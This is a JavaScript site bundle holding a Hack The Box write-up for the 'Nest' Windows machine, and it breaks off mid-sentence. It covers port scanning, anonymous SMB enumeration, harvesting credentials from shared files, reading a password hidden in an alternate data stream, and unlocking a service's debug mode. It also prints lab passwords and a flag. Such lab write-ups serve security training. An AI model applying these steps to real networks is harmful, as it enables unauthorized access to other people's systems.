"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4962],{3905:(e,n,t)=>{t.d(n,{Zo:()=>m,kt:()=>g});var r=t(67294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},m=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,l=e.parentName,m=o(e,["components","mdxType","originalType","parentName"]),c=p(t),u=i,g=c["".concat(l,".").concat(u)]||c[u]||d[u]||a;return t?r.createElement(g,s(s({ref:n},m),{},{components:t})):r.createElement(g,s({ref:n},m))}));function g(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,s=new Array(a);s[0]=u;var o={};for(var l in n)hasOwnProperty.call(n,l)&&(o[l]=n[l]);o.originalType=e,o[c]="string"==typeof e?e:i,s[1]=o;for(var p=2;p<a;p++)s[p]=t[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},28887:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>a,metadata:()=>o,toc:()=>p});var r=t(87462),i=(t(67294),t(3905));const a={layout:"post",title:"Nest ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb"],date:"2020/06/05",thumbnail:"/img/HackTheBox/nest.png",toc:!0},s=void 0,o={unversionedId:"HackTheBox/Nest/write-up",id:"HackTheBox/Nest/write-up",title:"Nest ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Nest/write-up.md",sourceDirName:"HackTheBox/Nest",slug:"/HackTheBox/Nest/write-up",permalink:"/writeups/HackTheBox/Nest/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"smb",permalink:"/writeups/tags/smb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"}],version:"current",frontMatter:{layout:"post",title:"Nest ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","smb","pe","exploit","htb"],date:"2020/06/05",thumbnail:"/img/HackTheBox/nest.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Monteverde ",permalink:"/writeups/HackTheBox/Monteverde/write-up"},next:{title:"Obscurity ",permalink:"/writeups/HackTheBox/Obscurity/write-up"}},l={},p=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration: finding TempUser",id:"network-enumeration-finding-tempuser",level:3},{value:"Network Exploration: finding c.smith",id:"network-exploration-finding-csmith",level:3},{value:"Alternate Data Stream (ADS)",id:"alternate-data-stream-ads",level:3},{value:"Network service exploitation: finding Administrator",id:"network-service-exploitation-finding-administrator",level:3}],m={toc:p},c="wrapper";function d(e){let{components:n,...a}=e;return(0,i.kt)(c,(0,r.Z)({},m,a,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,i.kt)("h1",{id:""}),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Name:")," Nest"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Profile:")," ",(0,i.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/225"},"www.hackthebox.eu")),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"nest",src:t(75459).Z,width:"598",height:"381"})),(0,i.kt)("h1",{id:"-1"}),(0,i.kt)("h3",{id:"overview"},"Overview"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Network Enumeration: finding TempUser"),": port 445 (SMB), 4386, explore SMB shares"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Network Exploration: finding c.smith"),": listing SMB shares again"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Alternate Data Stream (ADS)"),": password of HQK Reporting via ADS"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Network service exploitation: finding Administrator"),": HQK Reporting debug mode, read LDAP config for Admin password")),(0,i.kt)("h3",{id:"network-enumeration-finding-tempuser"},"Network Enumeration: finding TempUser"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"TL;DR"),": port 445 (SMB), 4386, explore SMB shares"),(0,i.kt)("p",null,"I started with SYN scan on all ports with ",(0,i.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"BlackArch"),": ",(0,i.kt)("inlineCode",{parentName:"p"},"pacman -S nmap")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ sudo nmap -sS -p- 10.10.10.178 -o nmap_ports\n[sudo] password for cyfun:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:05 CET\nStats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 28.81% done; ETC: 21:19 (0:10:03 remaining)\nNmap scan report for 10.10.10.178\nHost is up (0.051s latency).\nNot shown: 65533 filtered ports\nPORT     STATE SERVICE\n445/tcp  open  microsoft-ds\n4386/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 543.24 seconds\n\n$ sudo nmap -sSVC -p 445,4386 10.10.10.178 -o nmap_services\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:24 CET\nStats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 50.00% done; ETC: 21:28 (0:02:02 remaining)\nNmap scan report for 10.10.10.178\nHost is up (0.031s latency).\n\nPORT     STATE SERVICE       VERSION\n445/tcp  open  microsoft-ds?\n4386/tcp open  unknown\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:\n|     Reporting Service V1.2\n|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:\n|     Reporting Service V1.2\n|     Unrecognised command\n|   Help:\n|     Reporting Service V1.2\n|     This service allows users to run queries against databases using the legacy HQK format\n|     AVAILABLE COMMANDS ---\n|     LIST\n|     SETDIR <Directory_Name>\n|     RUNQUERY <Query_ID>\n|     DEBUG <Password>\n|_    HELP <Command>\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port4386-TCP:V=7.80%I=7%D=3/23%Time=5E791B05%P=x86_64-unknown-linux-gnu\nSF:%r(NULL,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(Gener\nSF:icLines,3A,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>\\r\\nUnreco\nSF:gnised\\x20command\\r\\n>")%r(GetRequest,3A,"\\r\\nHQK\\x20Reporting\\x20Servi\nSF:ce\\x20V1\\.2\\r\\n\\r\\n>\\r\\nUnrecognised\\x20command\\r\\n>")%r(HTTPOptions,3A\nSF:,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>\\r\\nUnrecognised\\x20\nSF:command\\r\\n>")%r(RTSPRequest,3A,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\\nSF:.2\\r\\n\\r\\n>\\r\\nUnrecognised\\x20command\\r\\n>")%r(RPCCheck,21,"\\r\\nHQK\\x2\nSF:0Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(DNSVersionBindReqTCP,21,"\\r\nSF:\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(DNSStatusRequestTCP\nSF:,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(Help,F2,"\\r\\\nSF:nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>\\r\\nThis\\x20service\\x20al\nSF:lows\\x20users\\x20to\\x20run\\x20queries\\x20against\\x20databases\\x20using\\\nSF:x20the\\x20legacy\\x20HQK\\x20format\\r\\n\\r\\n---\\x20AVAILABLE\\x20COMMANDS\\x\nSF:20---\\r\\n\\r\\nLIST\\r\\nSETDIR\\x20<Directory_Name>\\r\\nRUNQUERY\\x20<Query_I\nSF:D>\\r\\nDEBUG\\x20<Password>\\r\\nHELP\\x20<Command>\\r\\n>")%r(SSLSessionReq,2\nSF:1,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(TerminalServer\nSF:Cookie,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(TLSSes\nSF:sionReq,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(Kerbe\nSF:ros,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(SMBProgNe\nSF:g,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(X11Probe,21\nSF:,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(FourOhFourReque\nSF:st,3A,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>\\r\\nUnrecognise\nSF:d\\x20command\\r\\n>")%r(LPDString,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20\nSF:V1\\.2\\r\\n\\r\\n>")%r(LDAPSearchReq,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x2\nSF:0V1\\.2\\r\\n\\r\\n>")%r(LDAPBindReq,21,"\\r\\nHQK\\x20Reporting\\x20Service\\x20\nSF:V1\\.2\\r\\n\\r\\n>")%r(SIPOptions,3A,"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\nSF:\\.2\\r\\n\\r\\n>\\r\\nUnrecognised\\x20command\\r\\n>")%r(LANDesk-RC,21,"\\r\\nHQK\nSF:\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>")%r(TerminalServer,21,"\\r\\nH\nSF:QK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n>");\n\nHost script results:\n|_clock-skew: 2m28s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-03-23T20:29:44\n|_  start_date: 2020-03-23T19:20:32\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 206.45 seconds\n')),(0,i.kt)("p",null,"So we have SMBv2 + unknown service on port 4386."),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://github.com/byt3bl33d3r/CrackMapExec"},"CrackMapExec"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"smb-enum-shares.nse")," and ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/CiscoCXSecurity/enum4linux"},"enum4linux")," don't find any\nshares because they support only SMB v1 that is disabled."),(0,i.kt)("p",null,"But ",(0,i.kt)("inlineCode",{parentName:"p"},"smbclient")," and msf modules works. So let's start ",(0,i.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," console (",(0,i.kt)("inlineCode",{parentName:"p"},"msfconsole"),")."),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"BlackArch"),": ",(0,i.kt)("inlineCode",{parentName:"p"},"pacman -S metasploit")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msf5 auxiliary(scanner/smb/smb_enumshares) > run\n\n[+] 10.10.10.178:445      - ADMIN$ - (DISK) Remote Admin\n[+] 10.10.10.178:445      - C$ - (DISK) Default share\n[+] 10.10.10.178:445      - Data - (DISK)\n[+] 10.10.10.178:445      - IPC$ - (IPC) Remote IPC\n[+] 10.10.10.178:445      - Secure$ - (DISK)\n[+] 10.10.10.178:445      - Users - (DISK)\n[*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf5 auxiliary(scanner/smb/smb2) > run\n\n[+] 10.10.10.178:445      - 10.10.10.178 supports SMB 2 [dialect 255.2] and has been online for 1 hours\n[*] 10.10.10.178:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n")),(0,i.kt)("p",null,"I found a few SMBv2 shares with ",(0,i.kt)("a",{parentName:"p",href:"https://www.metasploit.com/"},"metasploit")," but we can do the same thing\nwith ",(0,i.kt)("inlineCode",{parentName:"p"},"smbclient"),"."),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"BlackArch"),": ",(0,i.kt)("inlineCode",{parentName:"p"},"pacman -S smbclient")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ smbclient -L 10.10.10.178 -N\nUnable to initialize messaging context\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        Data            Disk\n        IPC$            IPC       Remote IPC\n        Secure$         Disk\n        Users           Disk\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)\nUnable to connect with SMB1 -- no workgroup available\n")),(0,i.kt)("p",null,"We can anonymously connect to ",(0,i.kt)("inlineCode",{parentName:"p"},"Users")," share and list folders in there to list\nusers:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ smbclient -N \\\\\\\\10.10.10.178\\\\Users\nUnable to initialize messaging context\nTry "help" to get a list of possible commands.\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\nNT_STATUS_ACCESS_DENIED listing \\Administrator\\*\nNT_STATUS_ACCESS_DENIED listing \\C.Smith\\*\nNT_STATUS_ACCESS_DENIED listing \\L.Frost\\*\nNT_STATUS_ACCESS_DENIED listing \\R.Thompson\\*\nNT_STATUS_ACCESS_DENIED listing \\TempUser\\*\n')),(0,i.kt)("p",null,"This way we found 5 users."),(0,i.kt)("p",null,"Currently we can't enumerate what is inside ",(0,i.kt)("inlineCode",{parentName:"p"},"Secure")," share."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ smbclient -N \\\\\\\\10.10.10.178\\\\Secure\nUnable to initialize messaging context\ntree connect failed: NT_STATUS_BAD_NETWORK_NAME\n")),(0,i.kt)("p",null,"By enumerating the ",(0,i.kt)("inlineCode",{parentName:"p"},"Data")," share we can find some interesting files:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ smbclient -N \\\\\\\\10.10.10.178\\\\Data\nUnable to initialize messaging context\nTry "help" to get a list of possible commands.\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\nNT_STATUS_ACCESS_DENIED listing \\IT\\*\nNT_STATUS_ACCESS_DENIED listing \\Production\\*\nNT_STATUS_ACCESS_DENIED listing \\Reports\\*\ngetting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)\ngetting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)\n')),(0,i.kt)("p",null,"By reading a welcome email we can find a generic account:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ cat smb/Shared/Templates/HR/Welcome\\ Email.txt\nWe would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>\n\nYou will find your home folder in the following location:\n\\\\HTB-NEST\\Users\\<USERNAME>\n\nIf you have any issues accessing specific services or workstations, please inform the\nIT department and use the credentials below until all systems have been set up for you.\n\nUsername: TempUser\nPassword: welcome2019\n\n\nThank you\nHR\n")),(0,i.kt)("h3",{id:"network-exploration-finding-csmith"},"Network Exploration: finding c.smith"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"TL;DR"),": listing SMB shares again"),(0,i.kt)("p",null,"We can enumerate ",(0,i.kt)("inlineCode",{parentName:"p"},"Data")," share again but using the ",(0,i.kt)("inlineCode",{parentName:"p"},"TempUser")," account this time,\nto list files we weren't able to see earlier:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ smbclient \\\\\\\\10.10.10.178\\\\Data -U TempUser\nUnable to initialize messaging context\nEnter WORKGROUP\\TempUser\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\ngetting file \\IT\\Configs\\Adobe\\editing.xml of size 246 as editing.xml (1,9 KiloBytes/sec) (average 1,9 KiloBytes/sec)\ngetting file \\IT\\Configs\\Adobe\\Options.txt of size 0 as Options.txt (0,0 KiloBytes/sec) (average 1,1 KiloBytes/sec)\ngetting file \\IT\\Configs\\Adobe\\projects.xml of size 258 as projects.xml (0,4 KiloBytes/sec) (average 0,6 KiloBytes/sec)\ngetting file \\IT\\Configs\\Adobe\\settings.xml of size 1274 as settings.xml (10,0 KiloBytes/sec) (average 1,8 KiloBytes/sec)\ngetting file \\IT\\Configs\\Atlas\\Temp.XML of size 1369 as Temp.XML (4,1 KiloBytes/sec) (average 2,4 KiloBytes/sec)\ngetting file \\IT\\Configs\\Microsoft\\Options.xml of size 4598 as Options.xml (36,2 KiloBytes/sec) (average 5,3 KiloBytes/sec)\ngetting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as config.xml (50,4 KiloBytes/sec) (average 8,9 KiloBytes/sec)\ngetting file \\IT\\Configs\\NotepadPlusPlus\\shortcuts.xml of size 2108 as shortcuts.xml (16,6 KiloBytes/sec) (average 9,5 KiloBytes/sec)\ngetting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as RU_config.xml (2,1 KiloBytes/sec) (average 9,0 KiloBytes/sec)\ngetting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0,4 KiloBytes/sec) (average 8,4 KiloBytes/sec)\ngetting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (3,4 KiloBytes/sec) (average 8,1 KiloBytes/sec)\n')),(0,i.kt)("p",null,"One of the file we retrieved is containing a password:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ grep -ri pass smb\nsmb/IT/Configs/RU Scanner/RU_config.xml:  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>\nsmb/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019\n\n$ cat \'smb/IT/Configs/RU Scanner/RU_config.xml\'\n<?xml version="1.0"?>\n<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n  <Port>389</Port>\n  <Username>c.smith</Username>\n  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>\n</ConfigFile>\n')),(0,i.kt)("p",null,"The ",(0,i.kt)("em",{parentName:"p"},"RU Scanner")," password is ciphered but pasting\n",(0,i.kt)("inlineCode",{parentName:"p"},"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")," in a search we can find some\ncode snippets that are able to decipher it."),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"VB.Net: ",(0,i.kt)("a",{parentName:"li",href:"https://dotnetfiddle.net/kiYWi4"},"https://dotnetfiddle.net/kiYWi4")),(0,i.kt)("li",{parentName:"ul"},"VB.Net: ",(0,i.kt)("a",{parentName:"li",href:"https://dotnetfiddle.net/vYnZLb"},"https://dotnetfiddle.net/vYnZLb"))),(0,i.kt)("p",null,"Deciphered password is ",(0,i.kt)("inlineCode",{parentName:"p"},"xRxRxPANCAK3SxRxRx")," for ",(0,i.kt)("inlineCode",{parentName:"p"},"c.smith")," user."),(0,i.kt)("p",null,"There is another file hinting us some files:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ tail smb/IT/Configs/NotepadPlusPlus/config.xml\n        <Find name="redeem on" />\n        <Find name="192" />\n        <Replace name="C_addEvent" />\n    </FindHistory>\n    <History nbMaxFile="15" inSubMenu="no" customLength="-1">\n        <File filename="C:\\windows\\System32\\drivers\\etc\\hosts" />\n        <File filename="\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt" />\n        <File filename="C:\\Users\\C.Smith\\Desktop\\todo.txt" />\n    </History>\n</NotepadPlus>\n')),(0,i.kt)("p",null,"So we can go back to ",(0,i.kt)("inlineCode",{parentName:"p"},"Users")," share with a real user this time (",(0,i.kt)("inlineCode",{parentName:"p"},"c.smith"),") and\ndownload all his personal files."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ smbclient \\\\\\\\10.10.10.178\\\\Users -U 'c.smith'\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\nNT_STATUS_ACCESS_DENIED listing \\Administrator\\*\ngetting file \\C.Smith\\HQK Reporting\\AD Integration Module\\HqkLdap.exe of size 17408 as HqkLdap.exe (42,7 KiloBytes/sec) (average 42,7 KiloBytes/sec)\ngetting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0,0 KiloBytes/sec) (average 34,7 KiloBytes/sec)\ngetting file \\C.Smith\\HQK Reporting\\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (1,9 KiloBytes/sec) (average 27,8 KiloBytes/sec)\ngetting file \\C.Smith\\user.txt of size 32 as user.txt (0,3 KiloBytes/sec) (average 23,2 KiloBytes/sec)\nNT_STATUS_ACCESS_DENIED listing \\L.Frost\\*\nNT_STATUS_ACCESS_DENIED listing \\R.Thompson\\*\nNT_STATUS_ACCESS_DENIED listing \\TempUser\\*\n")),(0,i.kt)("p",null,"This is where we find the user flag:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"cat smb/C.Smith/user.txt\ncf71b25404be5d84fd827e05f426e987\n")),(0,i.kt)("h3",{id:"alternate-data-stream-ads"},"Alternate Data Stream (ADS)"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"TL;DR"),": password of HQK Reporting via ADS"),(0,i.kt)("p",null,"Inside ",(0,i.kt)("inlineCode",{parentName:"p"},"Users")," share, in the ",(0,i.kt)("inlineCode",{parentName:"p"},"C.Smith")," folder, there are files related to\n",(0,i.kt)("inlineCode",{parentName:"p"},"HQK Reporting")," software."),(0,i.kt)("p",null,"There is a promising ",(0,i.kt)("inlineCode",{parentName:"p"},"Debug Mode Password.txt")," files but the files ize is 0 byte."),(0,i.kt)("p",null,"This gives us an hint an ADS (Alternate Data Stream) may be used."),(0,i.kt)("p",null,"As you can see below the default ",(0,i.kt)("inlineCode",{parentName:"p"},"$DATA")," stream is 0 byte when an alternate\nstream named ",(0,i.kt)("inlineCode",{parentName:"p"},"Password")," is 15 bytes. So we can download the file via the non-default\ndata stream."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ smbclient \\\\\\\\10.10.10.178\\\\Users -U \'c.smith\'\nUnable to initialize messaging context\nEnter WORKGROUP\\c.smith\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> cd "C.Smith\\HQK Reporting"\nsmb: \\C.Smith\\HQK Reporting\\> allinfo "Debug Mode Password.txt"\naltname: DEBUGM~1.TXT\ncreate_time:    ven. ao\xfbt  9 01:06:12 2019 CEST\naccess_time:    ven. ao\xfbt  9 01:06:12 2019 CEST\nwrite_time:     ven. ao\xfbt  9 01:08:17 2019 CEST\nchange_time:    ven. ao\xfbt  9 01:08:17 2019 CEST\nattributes: A (20)\nstream: [::$DATA], 0 bytes\nstream: [:Password:$DATA], 15 bytes\nsmb: \\C.Smith\\HQK Reporting\\> get "Debug Mode Password.txt:Password:$DATA"\ngetting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)\nsmb: \\C.Smith\\HQK Reporting\\>\n')),(0,i.kt)("p",null,"In this stream the file contains the password for accessing teh debug mode:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ cat smb/Debug\\ Mode\\ Password.txt:Password:\\$DATA\nWBQ201953D8w\n")),(0,i.kt)("h3",{id:"network-service-exploitation-finding-administrator"},"Network service exploitation: finding Administrator"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"TL;DR"),": HQK Reporting debug mode, read LDAP config for Admin password"),(0,i.kt)("p",null,"Now looking at the backup config file ",(0,i.kt)("inlineCode",{parentName:"p"},"HQK_Config_Backup.xml")," we can see the\nservice is running on port ",(0,i.kt)("inlineCode",{parentName:"p"},"4386"),". The open port we saw earlier with ",(0,i.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'$ cat C.Smith/HQK\\ Reporting/HQK_Config_Backup.xml\n<?xml version="1.0"?>\n<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n  <Port>4386</Port>\n  <QueryDirectory>C:\\Program Files\\HQK\\ALL QUERIES</QueryDirectory>\n</ServiceSettings>\n')),(0,i.kt)("p",null,"So let's open a TCP socket with ",(0,i.kt)("inlineCode",{parentName:"p"},"telnet")," to interact with the protocol:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ telnet 10.10.10.178 4386 \nTrying 10.10.10.178...\nConnected to 10.10.10.178.\nEscape character is '^]'.\n\nHQK Reporting Service V1.2\n\n>help\n\nThis service allows users to run queries against databases using the legacy HQK format\n\n--- AVAILABLE COMMANDS ---\n\nLIST\nSETDIR <Directory_Name>\nRUNQUERY <Query_ID>\nDEBUG <Password>\nHELP <Command>\n")),(0,i.kt)("p",null,"We can see there is a ",(0,i.kt)("inlineCode",{parentName:"p"},"DEBUG <Password>")," command requiring a password.\nAll good we have one!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">DEBUG WBQ201953D8w\n\nDebug mode enabled. Use the HELP command to view additional commands that are now available\n>help\n\nThis service allows users to run queries against databases using the legacy HQK format\n\n--- AVAILABLE COMMANDS ---\n\nLIST\nSETDIR <Directory_Name>\nRUNQUERY <Query_ID>\nDEBUG <Password>\nHELP <Command>\nSERVICE\nSESSION\nSHOWQUERY <Query_ID>\n")),(0,i.kt)("p",null,"We have 3 new commands now, but let's start we the other commands we already had."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">LIST\n\nUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command\n\n QUERY FILES IN CURRENT DIRECTORY\n\n[DIR]  COMPARISONS\n[1]   Invoices (Ordered By Customer)\n[2]   Products Sold (Ordered By Customer)\n[3]   Products Sold In Last 30 Days\n\nCurrent Directory: ALL QUERIES\n")),(0,i.kt)("p",null,"It looks like ",(0,i.kt)("inlineCode",{parentName:"p"},"LIST")," = ",(0,i.kt)("inlineCode",{parentName:"p"},"ls")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"SETDIR")," = ",(0,i.kt)("inlineCode",{parentName:"p"},"cd"),", it's obvious."),(0,i.kt)("p",null,"We are currently in ",(0,i.kt)("inlineCode",{parentName:"p"},"ALL QUERIES")," directory. Let's go back upper in the 